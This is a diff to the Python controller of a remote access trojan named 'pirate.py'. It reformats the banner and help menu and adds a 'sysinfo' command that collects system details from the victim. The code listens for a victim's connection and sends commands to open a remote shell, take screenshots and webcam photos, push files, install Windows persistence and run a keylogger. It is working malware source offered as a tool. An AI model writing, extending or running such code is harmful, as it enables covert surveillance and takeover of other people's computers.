@@ -13,35 +13,35 @@ class RAT:
 
     def banner(self):
         print('''	
-\t\t @@@@@                                        @@@@@
-\t\t@@@@@@@                                      @@@@@@@
-\t\t@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
-\t\t @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
-\t\t     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
-\t\t       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
-\t\t         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
-\t\t            @@@@@@@    @@@@@@    @@@@@@
-\t\t            @@@@@@      @@@@      @@@@@
-\t\t            @@@@@@      @@@@      @@@@@
-\t\t             @@@@@@    @@@@@@    @@@@@
-\t\t              @@@@@@@@@@@  @@@@@@@@@@
-\t\t               @@@@@@@@@@  @@@@@@@@@
-\t\t           @@   @@@@@@@@@@@@@@@@@   @@
-\t\t           @@@@  @@@@ @ @ @ @ @@@@  @@@@
-\t\t          @@@@@   @@@ @ @ @ @ @@@   @@@@@
-\t\t        @@@@@      @@@@@@@@@@@@@      @@@@@
-\t\t      @@@@          @@@@@@@@@@@          @@@@
-\t\t   @@@@@              @@@@@@@              @@@@@
-\t\t  @@@@@@@                                 @@@@@@@
-\t\t   @@@@@                                   @@@@@''')
+ @@@@@                                        @@@@@
+@@@@@@@                                      @@@@@@@
+@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
+ @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
+     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
+       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
+         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
+            @@@@@@@    @@@@@@    @@@@@@
+            @@@@@@      @@@@      @@@@@
+            @@@@@@      @@@@      @@@@@
+             @@@@@@    @@@@@@    @@@@@
+              @@@@@@@@@@@  @@@@@@@@@@
+               @@@@@@@@@@  @@@@@@@@@
+           @@   @@@@@@@@@@@@@@@@@   @@
+           @@@@  @@@@ @ @ @ @ @@@@  @@@@
+          @@@@@   @@@ @ @ @ @ @@@   @@@@@
+        @@@@@      @@@@@@@@@@@@@      @@@@@
+      @@@@          @@@@@@@@@@@          @@@@
+   @@@@@              @@@@@@@              @@@@@
+  @@@@@@@                                 @@@@@@@
+   @@@@@                                   @@@@@''')
 
     def listen(self):
         s = self.socket
         s.bind(self.address)
         s.listen()
-        print('\n\t\t\t     [*] Listening on port: %i'%self.port)
+        print('\n[*] Listening on port: %i'%self.port)
         self.conn, self.addr = s.accept()
-        print('\t\t\t     [+] Connection received from',self.addr)
+        print('[+] Connection received from',self.addr)
         self.main()
     def clear(self):
         if sys.platform.startswith('win'):
@@ -49,14 +49,15 @@ class RAT:
         else:
             os.system('clear')
     def help(self):
-        print('help:\tshow this message')
-        print('clear:\tclear console')            
-        print('shell:\topen shell on victim machine')
-        print('screenshot:\ttake screenshot from victim machine')
-        print('webcam:\ttake picture from victims webcam')
-        print('send_file:\tsend file to victim machine')
-        print('persistence:\trun persistence script (windows only)')
-        print('keylogger:\trun keylogger on victim machine')
+        print('sysinfo       ::  show victims system info')
+        print('shell         ::  open shell on victim machine')
+        print('screenshot    ::  take screenshot from victim machine')
+        print('webcam        ::  take picture from victims webcam')
+        print('send_file     ::  send file to victim machine')
+        print('persistence   ::  run persistence script (windows only)')
+        print('keylogger     ::  run keylogger on victim machine')
+        print('help          ::  show this message')
+        print('clear         ::  clear console')    
         print()
 
     def main(self):
@@ -75,7 +76,7 @@ class RAT:
                         pass
                     else:
                         conn.send(('shell:'+cmd).encode())
-                        print(conn.recv(50000).decode('Latin-1'))
+                        print(conn.recv(40960).decode('Latin-1'))
             elif cmd == 'clear':
                 self.clear()
             elif cmd == 'help':
@@ -142,6 +143,11 @@ class RAT:
                             print(conn.recv(2048).decode())
                         else:
                             print('[!] Error, keylogger not started!')
+
+            elif cmd == 'sysinfo':
+                conn.send(cmd.encode())
+                sysinfo = conn.recv(4096).decode('Latin_1')
+                print(sysinfo)
             elif cmd == '':
                 pass
 
@@ -154,7 +160,7 @@ def init():
     if len(sys.argv) >= 2:
         main = RAT(int(sys.argv[1]))
         main.clear()
-        main.banner()
+        #main.banner()
         main.listen()
     else:
         print('Usage: pirate.py <port>')
